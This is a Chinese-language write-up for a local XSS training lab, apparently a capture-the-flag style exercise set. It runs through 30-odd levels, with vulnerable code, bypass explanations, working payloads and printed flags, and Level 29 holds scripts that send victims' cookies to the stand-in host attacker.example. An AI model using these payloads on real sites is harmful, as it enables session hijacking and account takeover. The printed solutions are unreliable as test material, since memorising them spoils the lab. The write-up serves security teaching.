# XSS Labs Writeup

## Level 1: Reflected XSS (Basic)

**源码分析：**
```php
$name = $_GET['name'];
// Vulnerability: No sanitization
echo "Hello, " . $name . "!";
```
后端直接接收 `name` 参数并输出到页面中，没有任何过滤或转义。

**通关思路：**
直接构造 Payload 即可。
**Payload:** `<script>alert(1)</script>`

---

## Level 2: DOM-based XSS

**源码分析：**
```javascript
const keyword = urlParams.get('keyword');
if (keyword) {
    const container = document.getElementById('result');
    container.innerHTML = "Search results for: " + keyword;
    // ... manual script execution logic ...
}
```
JS 从 URL 获取 `keyword` 参数并写入 `innerHTML`。虽然通常 `innerHTML` 不执行 `<script>`，但本关卡模拟了框架行为，主动扫描并执行了注入的脚本。

**通关思路：**
利用 `<img>` 等标签的事件属性，或者直接利用模拟执行的特性。
**Payload 1:** `<img src=x onerror=alert(1)>`
**Payload 2:** `<script>alert(1)</script>` (得益于模拟执行逻辑)

---

## Level 3: Stored XSS

**源码分析：**
```php
// 写入
file_put_contents($file, json_encode($data));
// 读取并输出
foreach (array_reverse($comments) as $c):
    echo $c['text']; // Vulnerability: No sanitization
endforeach;
```
用户的评论被保存到 JSON 文件中，读取时未经过 `htmlspecialchars` 处理直接输出。

**通关思路：**
在评论框输入恶意脚本，脚本被存储。当页面加载时，脚本被渲染执行。
**Payload:** `<script>alert(1)</script>`

---

## Level 4: Attribute Breakout

**源码分析：**
```php
$keyword = $_GET['keyword'];
// ...
echo '<input type="text" name="keyword" value="' . $keyword . '">';
```
输入被输出到了 `<input>` 标签的 `value` 属性中，且由**双引号**包裹。后端未对双引号进行转义。

**通关思路：**
闭合前面的双引号，添加事件属性，注释掉后面的内容。
**Payload:** `" onclick="alert(1)`
**解析后 HTML:** `<input value="" onclick="alert(1)">`

---

## Level 5: Filter Bypass (No Script)

**源码分析：**
```php
$str = str_ireplace("<script", "<scr_ipt", $str);
// on events are ALLOWED
```
后端使用 `str_ireplace` 将 `<script` 替换为 `<scr_ipt`，这阻止了直接使用 `<script>` 标签。但未过滤事件属性（如 `on...`）或伪协议。

**通关思路：**
利用不需要 `<script>` 标签的 Payload，例如 `<a>` 标签的 `href` 属性或事件属性。
**Payload:** `<a href="javascript:alert(1)">Click</a>`
**Payload:** `<img src=x onerror=alert(1)>`

---

## Level 6: Quote Filtering

**源码分析：**
```php
$keyword_safe = str_replace('"', '&quot;', $keyword);
// ...
echo "<input type='text' name='keyword' value='" . $keyword_safe . "'>";
```
后端过滤了双引号 `"`，但 HTML 源码中使用**单引号** `'` 包裹属性值。

**通关思路：**
利用 HTML 解析的宽容性，使用单引号闭合属性。
**Payload:** `' onclick='alert(1)`
**解析后 HTML:** `<input value='' onclick='alert(1)'>`

---

## Level 7: Keyword Removal (Double Write)

**源码分析：**
```php
$bad_words = ['script', 'on', 'src', 'data', 'href'];
$str = str_ireplace($bad_words, '', $str);
```
后端将敏感关键词替换为空字符串，且只执行了一次替换（非递归）。

**通关思路：**
双写关键词。例如 `script` 被替换为空，那么 `scrscriptipt` 中间的 `script` 消失后，两边的字符会重新拼合。
**Payload:** `"><scrscriptipt>alert(1)</scrscriptipt>`

---

## Level 8: Encoding Bypass

**源码分析：**
```php
$str = str_replace("script", "scr_ipt", $str);
// ... other replacements ...
$str = str_replace('"', '&quot;', $str);
echo '<a href="' . $str . '">Your Link</a>';
```
后端替换了大量关键词，并转义了双引号。但是输入点在 `href` 属性中。

**通关思路：**
利用 HTML 实体编码。浏览器在解析属性值时会自动解码实体。
**Payload:** `&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;&#41;` (j 被编码为 `&#106;`)
**浏览器解析:** `href="javascript:alert(1)"`

---

## Level 9: URL Validation

**源码分析：**
```php
$str = str_ireplace("script", "", $str); // 关键词清洗
if (strpos($str, 'http://') === false) {
    die("Error"); // 必须包含 http://
}
```
1.  输入必须包含 `http://`。
2.  `script` 关键词被清洗（替换为空）。

**通关思路：**
构造包含 `http://` 的 Payload，同时利用双写绕过 `script` 清洗。利用 JS 注释 `//` 来隐藏 `http://`。
**Payload:** `javascrscriptipt:alert(document.cookie)//http://`
**后端清洗后:** `javascript:alert(document.cookie)//http://`

---

## Level 10: Protocol Bypass (Case Sensitivity)

**源码分析：**
```php
$str = str_replace("javascript", "", $str);
$str = str_replace("script", "", $str);
// 使用 str_replace (大小写敏感)
```
后端使用大小写敏感的 `str_replace` 过滤了全小写的 `javascript`。

**通关思路：**
利用浏览器对协议解析的大小写不敏感特性。
**Payload:** `JavaScript:alert(1)`
**后端处理:** 无法匹配 `javascript`，原样放行。
**浏览器解析:** 识别为 `javascript:` 协议并执行。

---

## Level 11: JS Context

**源码分析：**
```php
$str_safe = str_replace(['<', '>'], ['&lt;', '&gt;'], $str);
echo "var t_str = '$str_safe';";
```
输入被放置在 JS 变量的单引号字符串中。
虽然过滤了 `<` 和 `>`（防止直接闭合 `<script>` 标签），但**没有过滤单引号 `'`**。

**通关思路：**
闭合前面的单引号，使用分号结束语句，执行 Payload，注释掉后面的内容。
**Payload:** `';alert(1);//`
**生成代码:** `var t_str = '';alert(1);//';`

---

## Level 12: DOM XSS via Hash

**源码分析：**
```javascript
var hash = window.location.hash;
if (hash) {
    var content = decodeURIComponent(hash.substring(1));
    document.getElementById('message-container').innerHTML = "Welcome back, " + content;
}
```
后端完全没有处理输入，因为输入是通过 URL Hash (`#`) 传递的，这部分根本不会发送给服务器。
前端 JS 读取 `location.hash` 并写入 `innerHTML`。

**通关思路：**
这是一种纯前端的 DOM XSS。由于数据不经过服务器，所有服务端 WAF 都无效。
直接构造包含 Payload 的 Hash。
**Payload:** `#<img src=x onerror=alert(1)>`
**注意:** 由于使用 `innerHTML`，直接 `<script>` 通常不执行，推荐使用 `<img>` 或 `<iframe>`。

---

## Level 13: Frontend Filter

**源码分析：**
```javascript
const blacklist = /<script|javascript:/i;
if (blacklist.test(keyword)) {
    // Blocked
} else {
    document.getElementById('result').innerHTML = "Results: " + keyword;
}
```
JS 使用正则 `/ <script|javascript:/i` 对输入进行了检测。如果通过，则写入 `innerHTML`。

**通关思路：**
正则只拦截了 `<script` 和 `javascript:`。但 `innerHTML` 还支持其他大量的 XSS 向量，如 `<img>`, `<iframe>`, `<svg>` 等。
**Payload:** `<img src=x onerror=alert(1)>`
**Payload:** `<svg/onload=alert(1)>`

---

## Level 14: Double Encoding

**源码分析：**
```php
$encoded = urlencode($str);
echo "var currentUrl = '$encoded';";
```
后端对输入进行了 `urlencode`，看起来很安全，`%`、`'`、`<` 等都会被编码。
但前端使用了危险的 Sink：
```javascript
var decodedUrl = decodeURIComponent(currentUrl);
setTimeout('console.log("' + decodedUrl + '")', 100);
```
`setTimeout` 的第一个参数如果是字符串，会像 `eval` 一样执行代码。且执行前先进行了解码。

**通关思路：**
本关模拟了一个“双重编码”绕过场景。
1.  **WAF 过滤**：后端使用 `preg_match` 拦截了 `'`、`"`、`<`、`>`。如果直接输入 `';alert(1);//`，会被拦截并替换为 `_`。
2.  **后端编码**：WAF 检查通过后，后端使用 `urlencode` 对字符串进行了编码（例如 `'` 变成 `%27`）。
3.  **前端双重解码**：前端代码为了兼容旧数据，执行了**两次** `decodeURIComponent`。

**攻击路径：**
我们需要让 Payload 在经过 PHP 的自动 URL 解码后，仍然不包含 `'` 或 `"` 等危险字符（绕过 WAF），但在前端两次解码后还原出 `"`（双引号）。
*   **注意**：代码中的 Sink 是 `setTimeout('console.log("Log: ' + step2 + '")', 100);`。
    *   这里使用了**双引号** `"` 来包裹日志内容。
    *   所以我们需要闭合双引号，而不是单引号。
*   **输入**：`%22` (即 `"`)。
*   **WAF 检查**：检查 `%22`，未发现 `"`，放行。
*   **PHP 输出**：`urlencode('%22')` -> `%2522`。
*   **前端 Decode #1**：`decodeURIComponent('%2522')` -> `%22`。
*   **前端 Decode #2**：`decodeURIComponent('%22')` -> `"`。
*   **执行**：`setTimeout` 中字符串被闭合，代码执行。

**Payload:** `%22);alert(1);//`
**解释**：
*   `%22` -> `"` (闭合前面的双引号字符串)
*   `);` (闭合 `console.log(`)
*   `alert(1);` (执行代码)
*   `//` (注释掉后面多余的 `")`)
**注意：** 
如果浏览器地址栏自动对 `%` 进行编码，则实际输入 `%22` 即可。
如果需要手动构造完整编码包，则为 `%2522);alert(1);//`。
流程：`%2522` -> PHP解码 -> `%22` -> WAF通过 -> PHP编码 -> `%2522` -> JS双重解码 -> `"`。

---

## Level 15: Framework Injection

**源码分析：**
```php
$safe_html = htmlspecialchars($str);
echo "<div id='result'>Hello, $safe_html</div>";
```
虽然 HTML 标签被转义，但输出位于 AngularJS 的 `ng-app` 作用域内。AngularJS 会解析 `{{ }}` 模板语法。

**通关思路：**
利用 AngularJS 模板注入 (CSTI, Client-Side Template Injection)。
因为输出点在 `ng-app` 作用域内，AngularJS 会扫描并解析 `{{ ... }}` 语法。虽然 HTML 标签被转义了，但 `{{` 和 `}}` 没有被转义。

**Payload:** `{{constructor.constructor('alert(1)')()}}`

**Payload 解析：**
1.  `{{ ... }}`：AngularJS 的插值语法，其中的内容会被作为表达式求值。
2.  `constructor`：在 AngularJS 的表达式沙箱中，通常直接访问 `window` 或 `document` 是被禁止的。但是，我们可以访问对象的 `constructor` 属性。
3.  `constructor.constructor`：
    *   第一个 `constructor` 获取当前上下文对象（scope）的构造函数。
    *   第二个 `constructor` 获取该构造函数的构造函数，这通常就是 JavaScript 原生的 `Function` 构造函数。
    *   `Function` 构造函数允许我们将字符串当作代码来创建新的函数（类似于 `eval`）。
4.  `('alert(1)')`：这是传给 `Function` 构造函数的参数，即我们要执行的恶意代码。
5.  最后的 `()`：立即调用这个刚刚创建出来的匿名函数，从而执行 `alert(1)`。

简而言之，这个 Payload 利用了 JS 的原型链特性，绕过 AngularJS 的沙箱限制，动态构造并执行了一个包含 `alert(1)` 的函数。

---

## Level 16: PostMessage XSS

**源码分析：**
```javascript
window.addEventListener('message', function(e) {
    document.getElementById('message-output').innerHTML = "Received: " + e.data;
});
```
后端过滤了 `iframe` src 中的 `javascript:`，但允许 `data:`。
iframe 加载 `data:` 协议内容后，源变为 `null`（opaque origin），无法直接访问父页面 DOM。
但父页面有一个监听 `message` 事件的 Handler，且直接将接收到的数据写入 `innerHTML`。

**通关思路：**
构造一个 `data:` 协议的 iframe，在其中运行 JS，通过 `parent.postMessage()` 发送 XSS Payload 给父页面。
**Payload:** `data:text/html,<script>parent.postMessage('<img src=x onerror=alert(1)>', '*')</script>`

---

## Level 17: CSP Bypass (JSONP)

**源码分析：**
```php
header("Content-Security-Policy: default-src 'self'; script-src 'self';");
if (isset($_GET['callback'])) {
    echo $_GET['callback'] . '({"status": "ok"});';
    exit;
}
```
启用了一个严格的 CSP：只允许同源脚本，禁止 inline 脚本。
这意味着 `<script>alert(1)</script>` 无法执行。
但是，同源下有一个 JSONP 端点（`?callback=...`），它会返回 JavaScript 代码。

**通关思路：**
利用 CSP 允许的同源脚本源（'self'）。
我们可以加载这个 JSONP 端点作为脚本，并控制 callback 参数来执行任意 JS。
**Payload:** `<script src="?callback=alert(1)"></script>`

---

## Level 18: Anchor Href XSS

**源码分析：**
```php
$website_safe = htmlspecialchars($website, ENT_QUOTES); 
// ...
echo '<a href="' . $c['website'] . '">' . $c['author'] . '</a>';
```
输入被 `htmlspecialchars` 处理，这意味着双引号 `"` 和单引号 `'` 都会被转义，无法闭合 `href` 属性。
但是，`href` 属性本身支持 `javascript:` 伪协议。
代码**没有检查 URL 的协议头**。

**通关思路：**
直接在 Website 字段输入 `javascript:alert(1)`。
当其他用户（或管理员）点击评论者的名字时，JS 代码执行。
**Payload:** `javascript:alert(1)`

---

## Level 19: DOM XSS in Select

**源码分析：**
```javascript
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
}
// ...
document.write('</select>');
```
页面使用 `document.write` 动态生成了一个下拉菜单 (`<select>`)。
`storeId` 参数从 URL 获取后，直接拼接到 `document.write` 的 HTML 字符串中，且没有进行任何转义。

**通关思路：**
我们需要闭合当前的 `<option>` 和 `<select>` 标签，然后插入恶意标签。
**Payload:** `</option></select><img src=x onerror=alert(1)>`
**最终渲染结果：**
```html
<select name="storeId">
    <option selected></option></select><img src=x onerror=alert(1)></option>
    <!-- ... options ... -->
</select>
```
由于 `<select>` 被提前闭合，`<img>` 标签位于 `<select>` 之外，因此可以被浏览器解析并执行。

---

## Level 20: jQuery Anchor XSS

**源码分析：**
```javascript
var returnPath = new URLSearchParams(window.location.search).get('returnPath');
$('#backLink').attr('href', returnPath);
```
前端使用 jQuery 的 `attr` 方法将 URL 参数 `returnPath` 赋值给 `<a>` 标签的 `href` 属性。
jQuery 的 `attr` 方法虽然会处理属性值的引号问题，但**不会过滤伪协议**。

**通关思路：**
利用 `javascript:` 伪协议执行 XSS。
**Payload:** `javascript:alert(1)`

---

## Level 21: JS String Reflection

**源码分析：**
```php
searchTerm: '<?php echo isset($_GET['q']) ? htmlspecialchars($_GET['q'], ENT_COMPAT) : ''; ?>',
```
输入被反射在 JavaScript 对象的属性值中，被单引号包裹。
后端使用了 `htmlspecialchars($q, ENT_COMPAT)`。
*   `ENT_COMPAT` (默认模式) 仅编码双引号 `"`，**不编码单引号 `'`**。
*   HTML 实体编码（如 `<` 变 `&lt;`）在 JS 字符串中不起作用（JS 引擎不解析 HTML 实体）。

**通关思路：**
虽然 `<script>` 标签会被编码，但我们不需要它。我们只需要闭合 JS 字符串。
利用未被转义的单引号 `'` 闭合前面的字符串，插入 Payload，然后注释掉后面的内容。
**Payload:** `'-alert(1)-'`
**最终渲染代码：**
```javascript
searchTerm: ''-alert(1)-'',
```
这实际上是一个数学减法运算：`''` (空字符串) 减去 `alert(1)` 的返回值，再减去 `''`。在运算过程中 `alert(1)` 被执行。
或者使用分号：`';alert(1);//` -> `searchTerm: '';alert(1);//',`

---

## Level 22: Reflected DOM XSS

**源码分析：**
**服务端 (PHP):**
```php
$safe_q = str_replace('"', '\"', $q);
echo '{"results":[],"searchTerm":"' . $safe_q . '"}';
```
服务端试图通过转义双引号 `"` 来防止跳出 JSON 字符串值。但关键的是，它**没有转义反斜杠 `\`**。

**客户端 (JS):**
```javascript
var searchResultsObj = eval('(' + this.responseText + ')');
```
客户端使用 `eval()` 来解析服务端返回的 JSON 字符串。这是极其危险的操作，因为 `eval` 会执行任何有效的 JS 代码。

**通关思路：**
我们需要闭合 JSON 中的字符串。
由于服务端将 `"` 转义为 `\"`，我们无法直接使用 `"` 闭合。
但是，我们可以输入 `\"`。
1.  我们输入 `\`，服务端不转义，保留为 `\`。
2.  我们输入 `"`，服务端转义为 `\"`。
3.  组合起来，Payload `\"` 变成了 `\\"`。
4.  在 JS 字符串中：
    *   `\\` 解析为字面量反斜杠 `\`。
    *   `"` 解析为字符串结束引号（因为它前面的反斜杠已经被消耗了，不再起转义作用）。

**Payload:** `\"-alert(1)})//`

**执行流程解析：**
1.  用户输入: `\"-alert(1)})//`
2.  服务端处理: `\` 保持不变，`"` 变为 `\"`。结果: `\\"-alert(1)})//`
3.  JSON 响应: `{"results":...,"searchTerm":"\\"-alert(1)})//"}`
4.  `eval` 执行:
    *   代码被包裹在括号中: `(` + JSON + `)`
    *   `"searchTerm":"\\"` -> 字符串值为 `\`
    *   `-alert(1)` -> 减去 alert(1) 的结果 (导致 alert 执行)
    *   `})` -> 闭合对象和外层括号
    *   `//` -> 注释掉剩余字符 (即原本的 `"})`)
    *   最终代码: `({"searchTerm":"\\" -alert(1)})` -> 合法 JS 代码，执行成功。

**注意：**
`eval` 在处理 JSON 时通常会包裹一层括号 `eval('(' + json + ')')` 以强制解析为对象。因此，Payload 必须包含 `)` 来闭合这个外层括号，否则会报 SyntaxError。

---

## Level 23: Stored DOM XSS

**源码分析：**

**后端 (comment.php):**
后端负责接收评论并存储到 JSON 文件中。**没有任何过滤或转义逻辑**。这意味着无论用户提交什么，都会原样保存。

**前端 (JS):**
前端负责获取评论并在页面上显示。开发者意识到了 XSS 风险，因此实现了一个 `escapeHTML` 函数来转义危险字符。
```javascript
// VULNERABLE FUNCTION
function escapeHTML(html) {
    if (!html) return '';
    return html.replace('<', '&lt;').replace('>', '&gt;');
}

// ...
const safeText = escapeHTML(comment.text);
item.innerHTML = `... <div class="comment-body">${safeText}</div> ...`;
```
**核心漏洞点**：JavaScript 的 `String.prototype.replace(pattern, replacement)` 方法，当 `pattern` 是一个字符串时，它**只替换第一个匹配项**。
如果要替换所有匹配项，通常需要使用正则表达式（如 `/<g`）或 `replaceAll` 方法。
在这里，开发者错误地使用了字符串参数，导致如果输入中有多个 `<` 或 `>`，只有第一个会被转义，后面的都会保留原样。

**通关思路：**
我们需要构造一个 Payload，使得恶意的 HTML 标签位于第一个 `<` 和 `>` 之后。
我们可以简单地在 Payload 前面添加一对“牺牲品”尖括号。

**Payload:** `<><img src=1 onerror=alert(document.cookie)>`

**详细执行流程解析：**
1.  **提交评论**：攻击者在评论框中输入 `<><img src=1 onerror=alert(document.cookie)>` 并提交。
2.  **存储**：后端接收到该字符串，原样存入 `comments.json`。
3.  **加载评论**：页面加载（或刷新评论列表）时，JS 从后端获取该字符串。
4.  **不完全清洗**：
    *   `escapeHTML` 被调用。
    *   `html.replace('<', '&lt;')` 执行：字符串变成了 `&lt;><img src=1 onerror=alert(document.cookie)>`。注意，只有第一个 `<` 变了。
    *   `html.replace('>', '&gt;')` 执行：字符串变成了 `&lt;&gt;<img src=1 onerror=alert(document.cookie)>`。注意，只有第一个 `>` 变了。
5.  **DOM 渲染**：
    *   JS 将处理后的字符串插入到 `innerHTML` 中。
    *   浏览器解析 HTML：
        *   `&lt;&gt;` 被解析为普通的文本字符 `<>`。
        *   后面的 `<img src=1 onerror=alert(document.cookie)>` 仍然是有效的 HTML 标签结构！
    *   浏览器尝试加载图片（`src=1`），加载失败。
    *   触发 `onerror` 事件处理函数。
    *   执行 `alert(document.cookie)`，弹出 Flag。

**Flag:** `flag{a1b2c3d4-e5f6-7890-1234-567890abcdef}`

---

## Level 24: WAF Bypass (Tags/Attributes)

**源码分析：**
```php
// WAF Logic
$blocked_tags = ['script', 'img', 'iframe', ...]; // 包含绝大多数常见标签
$blocked_attributes = ['onload', 'onerror', 'onclick', ...]; // 包含绝大多数常见事件

// ...
if (preg_match("/<\s*$tag\b/i", $input_lower)) { die("Tag Not Allowed"); }
// ...
```
本关卡模拟了一个配置了 WAF (Web Application Firewall) 的环境。
1.  **黑名单机制**：后端定义了庞大的标签和属性黑名单。
2.  **反射点**：输入内容被直接反射在 `<h2>` 标签中。

**通关思路：**
面对黑名单 WAF，首要任务是**Fuzzing (模糊测试)**，找出哪些标签和属性是被允许的。
通过测试（或者查看源码/提示），我们可以发现：
*   **允许的标签**：`<body>`
*   **允许的属性**：`onresize`

我们需要构造一个 Payload，利用 `<body>` 标签和 `onresize` 事件。
但是，`onresize` 事件只有在窗口大小改变时才会触发。我们需要一种自动触发的方式。
**技巧**：使用 `<iframe>` (外部) 来加载这个 Payload，并在 `<iframe>` 加载完成时 (`onload`) 改变其自身的大小，从而触发内部页面的 `onresize` 事件。

**Payload:** `<body onresize=alert(document.cookie)>`

**利用步骤 (Exploit):**
由于这是一个 Reflected XSS，且需要用户交互（调整窗口大小）或特殊的触发条件，我们需要构造一个包含利用代码的恶意页面（Exploit Server）：

```html
<iframe src="http://target-site/level24/index.php?search=%3Cbody%20onresize=alert(document.cookie)%3E" onload="this.style.width='100px'"></iframe>
```

**原理解析：**
1.  受害者访问我们的恶意页面。
2.  页面加载一个 `iframe`，指向目标网站，URL 中包含 Payload `<body onresize=alert(document.cookie)>`。
3.  目标网站渲染页面，HTML 中出现 `<body onresize=alert(document.cookie)>`。
    *   虽然页面本身已有 `<body>`，但现代浏览器通常会解析后续的 `<body>` 标签，并将其属性合并或执行其中的脚本。
4.  `iframe` 加载完成后，触发 `iframe` 自身的 `onload` 事件：`this.style.width='100px'`。
5.  `iframe` 的宽度发生变化，导致 `iframe` 内部文档（即目标网站）的视口大小改变。
6.  目标网站捕捉到视口变化，触发 `body` 上的 `onresize` 事件。
7.  执行 `alert(document.cookie)`，弹出 Flag。

**Flag:** `flag{bf38249a-5e17-4861-8321-468213612345}`

---

## Level 25: SVG Animate XSS

**源码分析：**
```php
// WAF Logic
$blocked_tags = ['script', 'iframe', 'body', 'img', ...]; 
// 'svg', 'animatetransform' are ALLOWED

$blocked_attributes = ['onload', 'onerror', 'onclick', 'onresize', ...]; 
// 'onbegin' is ALLOWED
```
本关卡 WAF 更加严格，封禁了 `<body>` 和 `onresize`，甚至封禁了 `<img>` 和常见事件。
但是，它遗漏了 SVG 相关的标签和事件。

**通关思路：**
SVG (Scalable Vector Graphics) 拥有自己的一套标签和事件体系。
*   `<svg>` 标签可以包含 `<animate>` 或 `<animateTransform>` 等动画标签。
*   这些动画标签支持 `onbegin` 事件（动画开始时触发）。
*   利用这一点，我们可以构造一个不包含任何常见 HTML 标签或常见事件（如 `onload`, `onerror`）的 Payload。

**Payload:** `<svg><animatetransform onbegin=alert(1)>`

**注意：**
在某些浏览器中，SVG 动画事件可能需要特定的触发条件或兼容性支持。但在现代浏览器中，`onbegin` 通常会在 SVG 加载并开始渲染时自动触发。

**Flag:** `flag{e8f9a0b1-c2d3-4e5f-6a7b-8c9d0e1f2a3b}`

## Level 26: Canonical Link XSS

**源码分析：**
```php
// VULNERABILITY: 
// The developer uses htmlspecialchars without ENT_QUOTES to escape the URL.
// This means single quotes ' are NOT escaped.
$safe_url = htmlspecialchars($current_url); 
// ...
// The href attribute is enclosed in single quotes
echo "<link rel='canonical' href='$safe_url'>";
```
本关卡模拟了一个 SEO 优化场景，页面包含一个指向自身的 `<link rel="canonical">` 标签。
1.  **输入点**：URL 参数（`$_SERVER['REQUEST_URI']`）。
2.  **漏洞点**：PHP 的 `htmlspecialchars` 函数在默认情况下（PHP 8.1 之前）或未指定 `ENT_QUOTES` 时，**不会转义单引号**。
3.  **Sink**：`<link href='...'>` 属性值被单引号包裹。

**通关思路：**
由于单引号未被转义，我们可以使用单引号 `'` 闭合 `href` 属性，然后注入其他属性。
虽然 `<link>` 标签通常不可见，但我们可以利用 `accesskey` 属性配合 `onclick` 事件。
*   `accesskey="x"`：定义激活元素的快捷键（Windows 下通常是 `Alt + Shift + X`）。
*   `onclick="alert(1)"`：当元素被激活（点击或快捷键）时触发。

**Payload:** `/?%27accesskey=%27x%27onclick=%27alert(1)`

**执行流程解析：**
1.  用户访问 URL：`http://localhost/level26/?'accesskey='x'onclick='alert(1)`
2.  服务端生成的 HTML：
    ```html
    <link rel="canonical" href='http://localhost/level26/?'accesskey='x'onclick='alert(1)'>
    ```
3.  浏览器解析：
    *   `href='http://localhost/level26/?'` (属性结束)
    *   `accesskey='x'` (新属性)
    *   `onclick='alert(1)'` (新属性)
    *   `>` (标签结束)
4.  **触发攻击**：用户按下快捷键 `Alt + Shift + X` (Windows) 或 `Ctrl + Alt + X` (Mac)，触发 `onclick` 事件，执行 `alert(1)`。

**Flag:** `flag{a1b2c3d4-e5f6-7890-1234-567890abcdef}`

## Level 27: Stored XSS into onclick event

**源码分析：**
- 入口与存储：评论通过 POST 被写入 [index.php](file:///d:/Book/XSS-Sec/level27/index.php) 的 JSON 文件 [comments.json](file:///d:/Book/XSS-Sec/level27/comments.json) 中，未对字段进行安全校验
```php
save_comment($dataFile, [
    'author' => $author,
    'website' => $website,
    'text' => $text,
    'time' => time()
]);
```
- 反射点：作者名上的链接不是使用 href，而是绑定了 onclick，将 Website 字段原样（仅做引号转义）置入单引号包裹的 JS 字符串，并赋值给 window.location.href
```php
$website_for_js = encode_for_onclick_js_single_quoted($website_raw);
<a href="#" onclick="window.location.href='<?php echo $website_for_js; ?>'; return false;">
```
- encode_for_onclick_js_single_quoted 只做了引号和尖括号的替换，但不会阻止 javascript: 这种伪协议
```php
function encode_for_onclick_js_single_quoted($s) {
    $s = str_replace("\\", "\\\\", $s);
    $s = str_replace("'", "\\'", $s);
    $s = str_replace('"', '&quot;', $s);
    $s = str_replace("<", "&lt;", $s);
    $s = str_replace(">", "&gt;", $s);
    return $s;
}
```

**通关思路：**
- 将 Website 字段设置为 javascript 伪协议，点击作者名时浏览器直接执行该 JS
- 评论正文 text 在该页面经过 htmlspecialchars 输出，不易利用；本关关键在于 Website 的 onclick 跳转

**Payload:** `javascript:alert(document.cookie)`

---

## Level 28: Reflected XSS into a template literal

**源码分析：**
- 输入 q 被处理为 $escaped 并放入 JS 模板字符串中：[index.php](file:///d:/Book/XSS-Sec/level28/index.php)
```php
$escaped = escape_for_template_literal($q);
<script>
    const preview = `Searching for: <?php echo $escaped; ?>`;
    document.getElementById('result').innerText = preview;
</script>
```
- 逃逸函数只对 `< > " ' \ `` 做了 Unicode 转义，未处理占位符语法标识 `${` 与 `}`：
```php
function escape_for_template_literal($s) {
    return strtr($s, [
        '<' => '\\u003C', '>' => '\\u003E', '"' => '\\u0022',
        "'" => '\\u0027', '\\' => '\\u005C', '`' => '\\u0060',
    ]);
}
```
- 在 ES6 模板字符串中，`${...}` 会在构造字符串阶段被求值，因此只要能插入 `${...}`，表达式即刻执行

**通关思路：**
- 构造 `${alert(1)}` 放入 q，模板字符串在生成时执行 alert，再将结果拼接到字符串中；innerText 仅用于最终展示，不影响执行

**Payload:** `${alert(1)}`

---

## Level 29: Stored XSS + Cookie 窃取 + 会话劫持

**源码分析：**
- 评论存储与输出：
  - 发布页 [index.php](file:///d:/Book/XSS-Sec/level29/index.php) 直接将 `text` 原样 echo，未做转义
  - 受害者视图 [admin-view.php](file:///d:/Book/XSS-Sec/level29/admin-view.php) 同样对 `text` 原样输出，任何脚本都会执行
```php
// index.php
<div class="text"><?php echo $c['text']; ?></div>
// admin-view.php
<div><?php echo $c['text']; ?></div>
```
- 管理员 Cookie：受害者视图设置了管理员的 session Cookie（模拟受害者浏览器环境）
```php
setcookie('session', 'admin_session_value', time() + 1800, '/level29/admin-view.php');
```
- 权限页面 [my-account.php](file:///d:/Book/XSS-Sec/level29/my-account.php) 通过 Cookie 判断是否为管理员
```php
$isAdmin = isset($_COOKIE['session']) && $_COOKIE['session'] === 'admin_session_value';
```
- 清空评论功能存在于发布页，便于测试链路
```php
if (isset($_POST['action']) && $_POST['action'] === 'clear') { file_put_contents($dataFile, '[]'); }
```

**通关思路：**
1. 在发布页提交存储型 XSS，利用受害者视图自动载入评论执行脚本
2. 脚本中读取受害者（管理员） Cookie 并外带到攻击者服务器
3. 攻击者将窃取的 Cookie 值设置到自己的浏览器，然后访问 my-account.php 获得管理员权限与 Flag

**示例 Payload（评论 text 字段）：**
```html
<script>
  new Image().src = 'https://attacker.example/collect?c=' + encodeURIComponent(document.cookie);
</script>
```
或使用更隐蔽的标签事件：
```html
<img src=x onerror="fetch('https://attacker.example/collect?c='+encodeURIComponent(document.cookie))">
```

**Flag 获取：**
- 将浏览器的 `session` Cookie 设置为 `admin_session_value` 后，访问 [my-account.php](file:///d:/Book/XSS-Sec/level29/my-account.php) 即可显示：
```
flag{64a307ae-44e4-4c23-9246-65c3c0174098}
```

---

## Level 30: AngularJS 沙箱逃逸（无字符串）

**源码分析：**
- 表达式注入点位于模板插值与 ng-init：[index.php](file:///d:/Book/XSS-Sec/level30/index.php)
```php
// 取第一个 & 之后的整段查询串作为表达式，进行 urldecode 后注入
<div>{{ <?php echo $expr; ?> }}</div>
<div ng-init="<?php echo $expr; ?>"></div>
```
- AngularJS 版本为 1.4.4（按实验环境），该版本的沙箱可通过覆盖 String.prototype.charAt 并配合 orderBy 过滤器参数构造实现逃逸

**通关思路：**
- 使用 PortSwigger 提供的无字符串逃逸链：
  1. 通过 `toString()` 获取 String 原型，再通过 `constructor.prototype.charAt=[].join` 覆盖 charAt 破坏沙箱标识符检查
  2. 利用 `[1]|orderBy:` 将右侧作为过滤器参数
  3. 再次通过 `toString().constructor.fromCharCode(...)` 生成字符串 `x=alert(1)`，完成执行

**Payload：**
```
?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```
说明：
- `%3d` 为 `=` 的 URL 编码；整体查询串会被服务端 urldecode 后原样注入表达式
- `fromCharCode(120,61,97,108,101,114,116,40,49,41)` 生成字符串 `x=alert(1)`
- 该链条在 1.4.4 环境下可在无显式字符串与无 `$eval` 的条件下完成沙箱逃逸并执行

---

## Level 31: AngularJS CSP Escape

**源码分析：**
- CSP 设置在页面头部：[level31/index.php](file:///d:/Book/XSS-Sec/level31/index.php#L1-L16)
```php
header("Content-Security-Policy: default-src 'self'; script-src 'self' https://ajax.googleapis.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; style-src-elem 'self' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com data:; img-src 'self' data:; connect-src 'self' https://ajax.googleapis.com; object-src 'none'; base-uri 'self'");
```
- Angular 环境与注入点：
  - 页面引入 AngularJS 1.4.4 并在 body 上启用 `ng-app`：[level31/index.php](file:///d:/Book/XSS-Sec/level31/index.php#L12-L17)
  - 反射逻辑对 `search` 做一次 URL 解码后直接输出到 DOM（位于 Angular 作用域内）：
```php
$render = urldecode($search);
<div id="content"><?php echo $render; ?></div>
```
- 自动触发逻辑：同源外部脚本在加载后尝试聚焦 `id=x` 的元素（用于触发 `ng-focus` 表达式）：[focus.js](file:///d:/Book/XSS-Sec/level31/focus.js)
```javascript
document.addEventListener('DOMContentLoaded', function () {
  setTimeout(function () {
    var el = document.getElementById('x');
